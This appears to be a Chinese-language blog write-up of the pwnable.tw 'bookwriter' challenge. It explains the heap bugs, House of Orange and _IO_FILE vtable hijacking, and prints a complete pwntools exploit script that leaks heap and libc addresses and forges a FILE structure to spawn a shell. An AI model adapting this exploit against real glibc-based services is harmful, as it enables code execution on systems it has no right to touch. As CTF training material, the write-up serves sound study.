@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得">
+<meta name="keywords" content="Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[_IO_FILE]pwnable.tw-bookwriter">
+<meta property="og:url" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/index.html">
+<meta property="og:site_name" content="ErosJohn&#39;s M.SPACE">
+<meta property="og:description" content="二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/000.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/001.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/002.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/003.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/004.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/005.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/006.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/007.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/008.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/009.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/010.png">
+<meta property="og:updated_time" content="2020-03-13T10:46:18.768Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[_IO_FILE]pwnable.tw-bookwriter">
+<meta name="twitter:description" content="二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/000.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>[_IO_FILE]pwnable.tw-bookwriter | ErosJohn's M.SPACE</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ErosJohn's M.SPACE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/13/IO-FILE-pwnable-tw-bookwriter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ErosJohn's M.SPACE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[_IO_FILE]pwnable.tw-bookwriter
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-13 16:19:43 / 修改时间：18:46:18" itemprop="dateCreated datePublished" datetime="2020-03-13T16:19:43+08:00">2020-03-13</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Heap/" itemprop="url" rel="index"><span itemprop="name">Heap</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得</p>
+<a id="more"></a>
+<hr>
+<h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p>距离上次更新已经过去很久，中间有一段时间没有搞pwn反而去看了机器学习，做了一段时间才发现其实自己并没有那么感兴趣，还是继续二进制。</p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>首次拿到题目，发现就是一个堆题，再仔细看看发现没有free功能，一下就想到了House of orange。<br>首先看一下编译Challenge的GCC版本。</p>
+<p><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/000.png" alt="000"><br>由此得知应该是glibc2.23(通过one_gadget与已知glibc比对确定是glibc2.23)<br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/001.png" alt="001"><br>查看保护措施以及文件架构，64位，NO PIE（真贴心啊，runpath改变是因为方便本地调试，已经经过patch过了）。<br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/002.png" alt="002"><br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/003.png" alt="003"><br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/004.png" alt="004"><br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/005.png" alt="005"><br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/006.png" alt="006"><br>基本功能如上图所示。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul>
+<li>首先进入时会读取Author，最大0x40大小，而Author在bss中为0x602060,page_bss为0x6020A0。且info函数中输出使用printf(遇到\0截断)，所以当0x40大小全部填满的时候printf会把紧跟在后的page_bss[0]中的内容也打印出来。</li>
+<li>edit函数会重新计算size大小，当把申请的chunk填满(下一chunk的前0x8也填满)时，由于strlen遇到\0截断，会造成size = size + 3。由于多的3位导致我们可以修改相邻的TOP_CHUNK的size域。</li>
+<li>Add函数中能够创建9个块，第九个块覆盖到size_bss[0]，导致page_bss[0]中可以写入非常大size的数据。</li>
+</ul>
+<p>由于没有free，所以我们要使用<font color="red">IO_FILE</font>相关攻击</p>
+<h2 id="TOP-CHUNK进入unsortedbin的条件"><a href="#TOP-CHUNK进入unsortedbin的条件" class="headerlink" title="TOP_CHUNK进入unsortedbin的条件"></a>TOP_CHUNK进入unsortedbin的条件</h2><ul>
+<li>size&gt;=MINSIZE </li>
+<li>pre_inuse</li>
+<li>top地址+size-1 是页对齐的（以000结尾）</li>
+</ul>
+<h2 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h2><p>文件结构体_IO_FILE_plus，包括了所有IO流结构。</p>
+<pre><code>extern struct _IO_FILE_plus *_IO_list_all;
+
+
+struct _IO_FILE_plus
+{
+    _IO_FILE file;
+    const struct _IO_jump_t *vtable;
+};
+</code></pre><h2 id="利用整体思路"><a href="#利用整体思路" class="headerlink" title="利用整体思路"></a>利用整体思路</h2><ol>
+<li>首先修改top块的size，然后申请一个较大的块（小于mmap申请的阈值，大于当前top块），当修改的size满足一定条件时，原来的top块会被释放到unsorted bin。</li>
+<li>覆写top块，将其bk指针覆写成_IO_list_all-0x10的地址。</li>
+</ol>
+<hr>
+<pre><code>while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) {
+            bck = victim-&gt;bk;
+            [...]
+            /* remove from unsorted list */
+            unsorted_chunks(av)-&gt;bk = bck;
+            bck-&gt;fd = unsorted_chunks(av);
+            if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)
+    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))
+  malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,
+                   chunk2mem (victim), av);
+            }
+// bck = _IO_list_all-0x10的地址，unsorted_chunks(av) = main_anera + 0x58，main_arena+ 0x58 的地址赋值给 _IO_list_all-0x10 的fd，即_IO_list_all。
+</code></pre><hr>
+<ol start="3">
+<li>继续申请chunk，造成unsorted bin attack，由于unsorted bin结构的破坏，调用malloc_printerr -&gt; __libc_message -&gt; abort() -&gt; _IO_flush_all_lockp() -&gt; _IO_OVERFLOW()，此时_IO_OVERFLOW已经被虚假的vtable中的system代替，由此getshell。</li>
+</ol>
+<h2 id="something-usable"><a href="#something-usable" class="headerlink" title="something usable"></a>something usable</h2><p><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/007.png" alt="007"><br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/008.png" alt="008"><br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/009.png" alt="009"><br><img src="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/010.png" alt="010"></p>
+<h1 id="完整Exploit"><a href="#完整Exploit" class="headerlink" title="完整Exploit"></a>完整Exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">eld = ELF(<span class="string">'./bookwriter'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./bookwriter'</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/home/griffin/Software/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index of page :'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index of page :'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(num,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(yes:1 / no:0) '</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    <span class="keyword">if</span>(num):</span><br><span class="line">        p.recvuntil(<span class="string">'Author :'</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Author :'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span> * <span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'b'</span> * <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\0'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>+<span class="string">'\x0f'</span>+<span class="string">'\0'</span>)</span><br><span class="line"><span class="comment"># ----</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(yes:1 / no:0) '</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr -&gt; "</span> + hex(heap_addr)</span><br><span class="line"><span class="comment"># ----</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'A'</span>*<span class="number">0x8</span>)</span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"AAAAAAAA"</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span>+hex(libc.address)</span><br><span class="line">raw_input(<span class="string">"libc_base leaked"</span>)</span><br><span class="line">data = <span class="string">'\0'</span>*<span class="number">0x310</span></span><br><span class="line">payload = <span class="string">'/bin/sh\0'</span>+p64(<span class="number">0x61</span>)+p64(libc_addr)+p64(libc.symbols[<span class="string">'_IO_list_all'</span>]<span class="number">-0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x310</span> + <span class="number">0xd8</span> + <span class="number">0x8</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line">raw_input(<span class="string">"EDIT DONE"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size of page :'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><ol>
+<li>Q：unsortedbin的大小为什么填写为0x61?<br>A：由于chain在结构体的偏移为0x68，当unsortedbin进入对于bin时，smallbin[4]内变成该unsortedbin的地址。</li>
+</ol>
+<ol start="2">
+<li>Q：Exploit中在Add TOP_CHUNK to unsortedbin时没有malloc一个大块?<br>A：scanf内部实现时malloc了一个0x1000的块，所以自己可以省略这一步。</li>
+</ol>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/168802" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168802</a><br><a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223334.htm</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/05/pwnable-tw-start/" rel="next" title="pwnable.tw-start">
+                <i class="fa fa-chevron-left"></i> pwnable.tw-start
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#写在开头"><span class="nav-number">1.</span> <span class="nav-text">写在开头</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TOP-CHUNK进入unsortedbin的条件"><span class="nav-number">2.2.</span> <span class="nav-text">TOP_CHUNK进入unsortedbin的条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO流"><span class="nav-number">2.3.</span> <span class="nav-text">IO流</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用整体思路"><span class="nav-number">2.4.</span> <span class="nav-text">利用整体思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#something-usable"><span class="nav-number">2.5.</span> <span class="nav-text">something usable</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#完整Exploit"><span class="nav-number">3.</span> <span class="nav-text">完整Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#疑问"><span class="nav-number">4.</span> <span class="nav-text">疑问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
